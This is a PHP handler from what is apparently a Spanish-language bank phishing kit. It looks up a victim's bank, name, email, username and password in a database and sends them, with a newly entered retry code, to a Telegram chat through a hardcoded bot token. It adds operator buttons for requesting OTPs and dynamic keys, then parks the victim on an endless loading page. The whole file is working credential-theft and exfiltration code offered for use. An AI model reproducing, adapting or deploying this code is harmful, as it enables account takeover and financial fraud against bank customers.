<?php
/**
 * enviar_dato_extra2.php
 * ----------------------
 * Handler POST de ERROR (variante 3) después de clave dinámica (opcion3.html).
 * El usuario envía un valor de reintento / error genérico.
 *
 * 7 pasos standard:
 *   1) Recibe $_POST['codigo'] / key.
 *   2) SELECT por key BINARY los datos previos de solicitudes.
 *   3) Nuevo request_id BCO_<144 bits>.
 *   4) UPDATE request_id + estado 'pendiente' (no guarda más datos extra en este script).
 *   5) Mensaje Telegram + teclado OPCION_9=ERROR Dinámica / OPCION_10=FINALIZAR.
 *   6) 302 → espera.html (loader indefinido).
 *   7) exit.
 */

ob_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1 ────────────────────────────────────────────────────────────────────
$codigo = $_POST['codigo'] ?? '';
$key    = $_POST['key']    ?? '';
if (!$key) {
    die("Error: Key no proporcionada.");
}

// ── Paso 2 ────────────────────────────────────────────────────────────────────
$stmt = $pdo->prepare(
    "SELECT numero_cuenta, monto, banco, nombre, telefono, correo
     FROM solicitudes WHERE BINARY `key` = ? LIMIT 1"
);
$stmt->execute([$key]);
$data = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$data) {
    die("Error: Solicitud no encontrada.");
}

$celular = $data['numero_cuenta'];
$monto   = $data['monto'];
$banco   = $data['banco'];
$usuario = $data['nombre'];
$clave   = $data['telefono'];
$correo  = $data['correo'];

// ── Paso 3 ────────────────────────────────────────────────────────────────────
try {
    $nuevo_request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $nuevo_request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

// ── Paso 4 ────────────────────────────────────────────────────────────────────
$update = $pdo->prepare(
    "UPDATE solicitudes SET request_id = ?, estado = 'pendiente' WHERE BINARY `key` = ?"
);
$update->execute([$nuevo_request_id, $key]);

// ── Paso 5 ────────────────────────────────────────────────────────────────────
$token   = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";
$chat_id = "-4923753161";

$mensaje  = "🧾 *Recibo Digital de Recarga (error / reintento)*\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💸 Recarga solicitada: $monto\n";
$mensaje .= "🏦 Banco elegido: $banco\n";
$mensaje .= "📧 Email: $correo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "Usuario: $usuario\n";
$mensaje .= "Contraseña: $clave\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "Valor reintento/error: $codigo\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━━━\n";

$botones = [
    'inline_keyboard' => [[
        ['text' => "clavedinamica",    'callback_data' => "OPCION_1_$nuevo_request_id"],
        ['text' => "otp",              'callback_data' => "OPCION_2_$nuevo_request_id"],
    ], [
        ['text' => "repetirusuario",   'callback_data' => "OPCION_3_$nuevo_request_id"],
        ['text' => "repetirdinamica",  'callback_data' => "OPCION_4_$nuevo_request_id"],
    ], [
        ['text' => "🔴ERROR Dinámica", 'callback_data' => "OPCION_9_$nuevo_request_id"],
        ['text' => "🟢FINALIZAR",      'callback_data' => "OPCION_10_$nuevo_request_id"],
    ]],
];

$payload = json_encode([
    'chat_id'      => $chat_id,
    'text'         => $mensaje,
    'reply_markup' => $botones,
]);
$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// ── Paso 6 y 7 ────────────────────────────────────────────────────────────────
header("Location: espera.html?rid=$nuevo_request_id&key=$key&correo=" . urlencode($correo));
exit;
